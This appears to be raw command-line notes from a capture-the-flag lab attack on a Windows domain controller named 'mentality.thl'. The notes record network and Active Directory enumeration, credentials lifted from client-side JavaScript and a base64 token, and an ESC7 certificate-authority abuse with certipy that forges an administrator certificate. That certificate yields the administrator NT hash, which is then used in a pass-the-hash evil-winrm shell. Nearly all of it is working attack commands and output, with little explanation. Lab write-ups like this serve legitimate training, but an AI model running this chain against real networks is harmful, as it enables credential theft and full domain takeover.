sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.56.107 -oN scan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 23:45 EDT
Nmap scan report for 192.168.56.107
Host is up (0.00045s latency).
Not shown: 58308 closed tcp ports (reset), 7198 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49693/tcp open  unknown
49701/tcp open  unknown
49712/tcp open  unknown
49741/tcp open  unknown
MAC Address: 08:00:27:8D:83:04 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ 

---------------------------------------------------------


nmap -p135,139,21,3268,3269,389,445,464,47001,49664,49665,49666,49667,49668,49669,49688,49689,49693,49701,49712,49741,53,593,5985,636,80,8080,88,9389 -sV -sC -Pn -vvv -n 192.168.56.107 -oN fullScan.txt 






--------------------------------------------------------------



```bash
netexec smb 192.168.56.107
```

SMB         192.168.56.107  445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) 
                                                                                                                                                                                                                                                            


--------------------------------------------------------------

María Gómez 
James Brown
Sara Lee

maria.gomez 
james.brown
sara.lee

hello@mentality.io


-----------------------------------------------------------

─$ gobuster dir -u http://192.168.56.107:8080 -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.107:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              css,js,txt,pdf,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 8477]
/admin                (Status: 301) [Size: 156] [--> http://192.168.56.107:8080/admin/]
/Index.html           (Status: 200) [Size: 8477]
/INDEX.html           (Status: 200) [Size: 8477]
/Admin                (Status: 301) [Size: 156] 

--------------------------------------------------------------------------------------------




ldapsearch -x -H ldap://192.168.56.107 -b "dc=mentality,dc=thl"  


------------------------------------------------------------

nxc ldap mentality.thl -u '' -p '' -M get-desc-users 




----------------------------------------------------------------------

wfuzz -c --hc=404,200 --hl=1 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST: FUZZ.mentality.thl:8080" -u 192.168.56.107







----------------------------------------------------------------------



http://192.168.56.107:8080/admin/




---

http://192.168.56.107:8080/admin/script.js


function validateForm() {
    const u = document.getElementById("username").value;
    const p = document.getElementById("password").value;
    const errorMessage = document.getElementById("errorMessage");

    if (u === "admin" && p === "adminpass123") {
        window.location.href = "dashboard.html";
        return false;
    }
    errorMessage.textContent = "Invalid Username Or Password!";
    return false;
}


<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>Mentality – Admin Login</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-wrapper">
    <form class="login-card" onsubmit="return validateForm();">
      <h1>Panel interno · Mentality</h1>

      <input type="text" id="username" placeholder="Usuario" autocomplete="off">
      <input type="password" id="password" placeholder="Contraseña" autocomplete="off">

      <button type="submit">Acceder</button>
      <p id="errorMessage" class="err"></p>
    </form>
  </div>

  <script src="script.js"></script>
</body>
</html>




-----------------------------------------------------------

System Diagnostics · Mentality
[INFO] Initialising diagnostic pipeline…
[INFO] Checking storage nodes… ok
[INFO] Verifying DR replication…… ok
[INFO] Running integrity checks… ok
[INFO] Packaging last differential… ok
[INFO] Secure token generated: ZnRwdXNlcjpTdXBlclNlY3JldDEyMyQ=
[INFO] Diagnostics completed successfully.





echo "ZnRwdXNlcjpTdXBlclNlY3JldDEyMyQ=" | base64 -d


└─$ echo "ZnRwdXNlcjpTdXBlclNlY3JldDEyMyQ=" | base64 -d
ftpuser:SuperSecret123$


ftp ftpuser@192.168.56.107



└─$ ftp ftpuser@192.168.56.107
Connected to 192.168.56.107.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||62173|)
150 Opening ASCII mode data connection.
07-17-25  08:52AM              1608612 ad_hc_mentality_htl.html
07-17-25  05:48AM                   34 flag.txt
07-17-25  12:13AM                   75 web.config
226 Transf




┌──(kali㉿kali)-[~/Documents/mentality]
└─$ ls                       
ad_hc_mentality_htl.html  flag.txt  fullScan.txt  scan.txt  web.config
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$  cat flag.txt 
FLAG{this_is_a_test_flag_for_ftp}




---------------------------------------------------------


rpcclient -U 'ftpuser%SuperSecret123$'  192.168.56.107


rpcclient -U 'ftpuser%SuperSecret123$'  192.168.56.107
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ftpuser] rid:[0x3e8]
user:[svcapp1] rid:[0x44e]
rpcclient $> 



rpcclient -U 'ftpuser%SuperSecret123$'  192.168.56.107 >  uservalid.txt




cat uservalid.txt | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sponge uservalid.txt

cat uservalid.txt | grep -oP '(?<=\[).*?(?=\])' | grep -v "0x" > usuarios_limpios.txt





impacket-GetNPUsers -usersfile uservalid.txt -no-pass mentality.thl/ 





----------------------------------------------------------------

file:///home/kali/Documents/mentality/ad_hc_mentality_htl.html



copy_backup 	groups.xml	svcapp1	Hola1234$	2025-07-17 15:35:58Z


nxc ldap 192.168.56.107 -u 'svcapp1' -p 'Hola1234$' 

netexec  smb 192.168.56.107 -u svcapp1 -p 'Hola1234$' 

netexec winrm -i 192.168.56.107 -u svcapp1 -p Hola1234$

---------------------------------------------------------------------

kerbrute userenum --dc mentality.thl -d mentality.thl User.txt 


└─$ kerbrute userenum --dc mentality.thl -d mentality.thl usuarios_limpios.txt   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/05/25 - Ronnie Flathers @ropnop

2025/09/05 00:55:36 >  Using KDC(s):
2025/09/05 00:55:36 >   mentality.thl:88

2025/09/05 00:55:36 >  [+] VALID USERNAME:       ftpuser@mentality.thl
2025/09/05 00:55:36 >  [+] VALID USERNAME:       Administrator@mentality.thl
2025/09/05 00:55:36 >  [+] VALID USERNAME:       svcapp1@mentality.thl
2025/09/05 00:55:36 >  Done! Tested 5 usernames (3 valid) in 0.003 seconds
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ 


-----------------------------------




──(kali㉿kali)-[~/Documents/mentality]
└─$ rpcclient -U "mentality.thl"/"svcapp1" 192.168.56.107

Password for [MENTALITY.THL\svcapp1]:
Cannot connect to server.  Error was NT_STATUS_PASSWORD_EXPIRED
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ 
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ smbpasswd -r 192.168.56.107 -U "svcapp1"

Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user svcapp1
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ netexec smb 192.168.56.107 -u 'svcapp1' -p "Patito12345"                                                 
SMB         192.168.56.107  445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.107  445    WIN-9FQTT7GPAVK  [+] mentality.thl\svcapp1:Patito12345 
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ 
 
---------------------------

impacket-GetNPUsers -usersfile uservalid.txt -no-pass mentality.thl/

impacket-GetUserSPNs mentality.thl/svcapp1:Hola1234$

impacket-GetUserSPNs mentality.thl/ftpuser:SuperSecret123$ -request






netexec smb 192.168.56.107 -u ftpuser -p 'SuperSecret123$'


netexec smb 192.168.56.107 -u svcapp1 -p 'Hola1234$'



certipy-ad find -u 'svcapp1' -p 'Patito12345' -dc-ip 192.168.56.107 -vulnerable -stdout










------------------------------------------------

└─$ smbpasswd -r 192.168.56.107 -U "svcapp1"

Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user svcapp1
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ netexec smb 192.168.56.107 -u 'svcapp1' -p "Patito12345"                                                 
SMB         192.168.56.107  445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.107  445    WIN-9FQTT7GPAVK  [+] mentality.thl\svcapp1:Patito12345 
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ cd ..             
                    

-------------------------------------------------








┌──(kali㉿kali)-[~/Documents/mentality]
└─$ certipy-ad find -u 'svcapp1' -p 'Patito12345' -dc-ip 192.168.56.107 -vulnerable -stdout 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 10 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'mentality-WIN-9FQTT7GPAVK-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'mentality-WIN-9FQTT7GPAVK-CA'
[*] Checking web enrollment for CA 'mentality-WIN-9FQTT7GPAVK-CA' @ 'WIN-9FQTT7GPAVK.mentality.thl'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : mentality-WIN-9FQTT7GPAVK-CA
    DNS Name                            : WIN-9FQTT7GPAVK.mentality.thl
    Certificate Subject                 : CN=mentality-WIN-9FQTT7GPAVK-CA, DC=mentality, DC=thl
    Certificate Serial Number           : 52F256456C27B2834A8DCCF7EE745646
    Certificate Validity Start          : 2025-07-17 13:46:02+00:00
    Certificate Validity End            : 2045-07-17 13:56:02+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MENTALITY.THL\Administrators
      Access Rights
        Enroll                          : MENTALITY.THL\Authenticated Users
                                          MENTALITY.THL\svcapp1
        ManageCa                        : MENTALITY.THL\svcapp1
                                          MENTALITY.THL\Domain Admins
                                          MENTALITY.THL\Enterprise Admins
                                          MENTALITY.THL\Administrators
        ManageCertificates              : MENTALITY.THL\Domain Admins
                                          MENTALITY.THL\Enterprise Admins
                                          MENTALITY.THL\Administrators
    [+] User Enrollable Principals      : MENTALITY.THL\svcapp1
                                          MENTALITY.THL\Authenticated Users
    [+] User ACL Principals             : MENTALITY.THL\svcapp1
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -add-officer svcapp1 -username svcapp1@mentality.thl -password 'Patito12345'             

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: MENTALITY.THL.
[!] Use -debug to print a stacktrace
[*] Successfully added officer 'svcapp1' on 'mentality-WIN-9FQTT7GPAVK-CA'
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -enable-template SubCA -username svcapp1@mentality.thl -password 'Patito12345'             
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: MENTALITY.THL.
[!] Use -debug to print a stacktrace
[*] Successfully enabled 'SubCA' on 'mentality-WIN-9FQTT7GPAVK-CA'
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ certipy-ad req -ca 'mentality-WIN-9FQTT7GPAVK-CA' -template SubCA -username svcapp1@mentality.thl -password 'Patito12345' -upn administrator@mentality.thl
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: MENTALITY.THL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 5
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '5.key'
[*] Wrote private key to '5.key'
[-] Failed to request certificate
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ certipy-ad req -ca 'mentality-WIN-9FQTT7GPAVK-CA' -template SubCA -username svcapp1@mentality.thl -password 'Patito12345' -upn administrator@mentality.thl
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: MENTALITY.THL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 6
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): N
[-] Failed to request certificate
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -issue-request 5 -username svcapp1@mentality.thl -password 'Patito12345'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: MENTALITY.THL.
[!] Use -debug to print a stacktrace
[*] Successfully issued certificate request ID 5
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ certipy-ad req -ca 'mentality-WIN-9FQTT7GPAVK-CA' -u 'svcapp1@mentality.thl' -p 'Patito12345' -target  'WIN-9FQTT7GPAVK.mentality.thl' -ns 192.168.56.107  -retrieve '5'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 5
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@mentality.thl'
[*] Certificate has no object SID
[*] Loaded private key from '5.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$  certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.107
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@mentality.thl'
[*] Using principal: 'administrator@mentality.thl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@mentality.thl': aad3b435b51404eeaad3b435b51404ee:058a4c99bab8b3d04a6bd959f95ce2b2
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mentality]
└─$ evil-winrm -i 192.168.56.107 -u administrator -H 058a4c99bab8b3d04a6bd959f95ce2b2
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/17/2025   7:46 AM             32 root_flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> 




---------------------------------------------------------


┌──(kali㉿kali)-[~/Documents/mentality]
└─$  evil-winrm -i 192.168.56.107 -u administrator -H 058a4c99bab8b3d04a6bd959f95ce2b2
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/17/2025   7:46 AM             32 root_flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type root_flag.txt
40422aa842d4917d88a885b10cb4b2d9
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
